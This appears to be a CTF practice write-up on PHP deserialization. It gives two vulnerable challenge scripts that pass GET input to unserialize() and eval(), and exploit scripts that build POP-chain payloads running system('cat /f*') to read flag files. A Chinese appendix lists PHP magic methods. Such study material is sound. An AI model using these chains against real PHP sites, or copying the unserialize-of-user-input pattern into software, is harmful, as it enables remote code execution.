```php
<?php

show_source(__FILE__);
###very___so___easy!!!!
class test{
    public $a;
    public $b;
    public $c;
    public function __wakeup(){
        $this->a='';
    }
    public function __destruct(){
        $this->b=$this->c;
        eval($this->a);
    }
}
$a=$_GET['a'];
if(!preg_match('/test":3/i',$a)){
    die("no");
}
$bbb=unserialize($_GET['a']);




$x=new test;
$x->b=&$x->a;
$x->c='system("cat /fffffffffflagafag");';
echo serialize($x);
```




```php
<?php
include "waf.php";
class NISA{
    public $fun="show_me_flag";
    public $txw4ever;
    public function __wakeup()
    {
        if($this->fun=="show_me_flag"){
            hint();
        }
    }
    function __call($from,$val){
        $this->fun=$val[0];
    }
    public function __toString()
    {
        echo $this->fun;
        return " ";
    }
    public function __invoke()
    {
        checkcheck($this->txw4ever);
        @eval($this->txw4ever);
    }
}
class TianXiWei{
    public $ext;
    public $x;
    public function __wakeup()
    {
        $this->ext->nisa($this->x);
    }
}
class Ilovetxw{
    public $huang;
    public $su;
    public function __call($fun1,$arg){
       $this->huang->fun=$arg[0];
    }
    public function __toString(){
        $bb = $this->su;
        return $bb();
    }
}

class four{
    public $a="TXW4EVER";
    private $fun='abc';
    public function __set($name, $value)
    {
        $this->$name=$value;
        if ($this->fun = "sixsixsix"){
            strtolower($this->a);
        }
    }
}
// function checkcheck($data){
//  if(preg_match(......)){
//      die(something wrong);
//  }
// }  
// function hint(){
//    echo ".......";
//    die();
// }

if(isset($_GET['ser'])){
    @unserialize($_GET['ser']);
}else{
    highlight_file(__FILE__);
}
```
![[Pasted image 20231212210542.png]]
![[Pasted image 20231212210600.png]]
![[Pasted image 20231212210612.png]]
![[Pasted image 20231212210629.png]]
![[Pasted image 20231212210638.png]]
![[Pasted image 20231212210646.png]]
![[Pasted image 20231212210701.png]]
![[Pasted image 20231212210720.png]]

```php
<?php
 
class NISA{
    public $fun="show_me_flag";
    public $txw4ever; // 1 shell
    public function __wakeup()
    {
        if($this->fun=="show_me_flag"){
            hint();
        }
    }
 
    function __call($from,$val){
        $this->fun=$val[0];
    }
 
    public function __toString()
    {
        echo $this->fun;
        return " ";
    }
    public function __invoke()
    {
        checkcheck($this->txw4ever);
        @eval($this->txw4ever);
    }
}
 
class TianXiWei{
    public $ext; //5 Ilovetxw
    public $x;
    public function __wakeup()
    {
        $this->ext->nisa($this->x);
    }
}
 
class Ilovetxw{
    public $huang; //4 four
    public $su; //2 NISA
 
    public function __call($fun1,$arg){
        $this->huang->fun=$arg[0];
    }
 
    public function __toString(){
        $bb = $this->su;
        return $bb();
    }
}
 
class four{
    public $a="TXW4EVER"; //3 Ilovetxw
    private $fun='sixsixsix'; //fun = "sixsixsix
 
    public function __set($name, $value)
    {
        $this->$name=$value;
        if ($this->fun = "sixsixsix"){
            strtolower($this->a);
        }
    }
}
 
 
$n = new NISA();
$n->txw4ever = 'System("cat /f*");';
$n->fun = "666";
$i = new Ilovetxw();
$i->su = $n;
$f = new four();
$f->a = $i;
$i = new Ilovetxw();
$i->huang = $f;
$t = new TianXiWei();
$t->ext = $i;
echo urlencode(serialize($t));
```

![[Pasted image 20231212210745.png]]


附录
```
__construct(): 类的构造函数。当一个对象被创建时自动调用。

  

__destruct(): 类的析构函数。当一个对象被销毁时自动调用。

  

__get($name): 在读取一个不可访问属性的值时自动调用。

  

__set($name, $value): 在给一个不可访问属性赋值时自动调用。

  

__isset($name): 在对不可访问属性调用 isset() 或 empty() 函数时自动调用。

  

__unset($name): 在对不可访问属性调用 unset() 函数时自动调用。

  

__call($name, $arguments): 在调用一个不存在或不可访问的方法时自动调用。

  

__callstatic($name, $arguments): 在调用一个不存在或不可访问的静态方法时自动调用。

  

__toString(): 在将对象作为字符串输出时自动调用。

  

__invoke($arguments): 当尝试将对象作为函数调用时自动调用。

  

__clone(): 当对象被克隆时自动调用。

  

__debugInfo(): 在使用 var_dump() 函数输出对象信息时自动调用。

  

__serialize(): 在对象被序列化时自动调用。

  

__unserialize($data): 在对象被反序列化时自动调用。

  

__sleep(): 在对象被序列化时自动调用，返回要序列化的属性列表。

  

__wakeup(): 在对象被反序列化时自动调用。
```